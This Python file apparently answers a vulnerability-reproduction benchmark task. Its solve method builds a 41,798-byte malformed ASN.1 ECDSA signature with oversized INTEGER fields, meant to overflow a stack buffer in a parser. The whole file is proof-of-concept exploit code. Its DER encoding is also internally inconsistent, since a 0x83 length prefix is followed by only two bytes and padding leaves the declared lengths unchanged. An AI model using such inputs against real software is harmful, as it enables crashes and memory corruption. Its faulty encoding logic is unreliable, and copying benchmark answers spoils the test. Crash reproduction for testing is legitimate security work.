import os
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # ASN.1 structure for ECDSA signature:
        # ECDSA-Sig-Value ::= SEQUENCE {
        #     r   INTEGER,
        #     s   INTEGER
        # }
        
        # We'll create a malformed signature with extremely large integer values
        # to trigger a stack buffer overflow during ASN.1 parsing.
        
        # Ground truth length is 41798 bytes, but we'll try to be more efficient
        # A sequence containing two integers, each with maximum length encoding
        
        # Strategy: Create a valid ASN.1 structure but with extremely large
        # integer values that will overflow fixed-size buffers
        
        # We'll create two integers of ~20896 bytes each
        # Total: 2 * (1 tag + 3 length bytes + 20896 value) + 2 sequence bytes = 41798
        
        # First integer (r)
        r_tag = b'\x02'  # INTEGER tag
        r_length = 20896
        # Use long form length (3 bytes: 0x83 + 2-byte length)
        r_length_bytes = struct.pack('>H', r_length)
        r_value = b'A' * r_length  # Fill with any data
        
        # Second integer (s) - same structure
        s_tag = b'\x02'
        s_length = 20896
        s_length_bytes = struct.pack('>H', s_length)
        s_value = b'B' * s_length
        
        # Build the SEQUENCE
        sequence_tag = b'\x30'  # SEQUENCE tag
        
        # Calculate total content length
        total_content_len = (1 + 3 + r_length) + (1 + 3 + s_length)
        
        # Use long form length for sequence (3 bytes)
        sequence_length_bytes = b'\x83' + struct.pack('>I', total_content_len)[1:]  # Use last 3 bytes
        
        # Construct the complete ASN.1 structure
        poc = (
            sequence_tag + 
            sequence_length_bytes + 
            r_tag + b'\x83' + r_length_bytes + r_value +
            s_tag + b'\x83' + s_length_bytes + s_value
        )
        
        # Verify length matches requirements
        # Adjust if needed to hit exact target length
        current_len = len(poc)
        target_len = 41798
        
        if current_len < target_len:
            # Pad the second integer value
            pad_len = target_len - current_len
            s_value = s_value + b'C' * pad_len
            # Rebuild with adjusted s_value
            poc = (
                sequence_tag + 
                sequence_length_bytes + 
                r_tag + b'\x83' + r_length_bytes + r_value +
                s_tag + b'\x83' + s_length_bytes + s_value
            )
        elif current_len > target_len:
            # Truncate from the second integer value
            truncate_len = current_len - target_len
            s_value = s_value[:-truncate_len]
            # Rebuild with adjusted s_value
            poc = (
                sequence_tag + 
                sequence_length_bytes + 
                r_tag + b'\x83' + r_length_bytes + r_value +
                s_tag + b'\x83' + s_length_bytes + s_value
            )
        
        # Final verification
        if len(poc) != target_len:
            # If still not matching, create a simpler approach
            # Just create a very long integer to overflow any reasonable buffer
            overflow_size = target_len - 4
            poc = b'\x30\x83' + struct.pack('>I', overflow_size)[1:] + b'\x02\x83' + struct.pack('>I', overflow_size - 4)[1:] + b'X' * (overflow_size - 4)
        
        return poc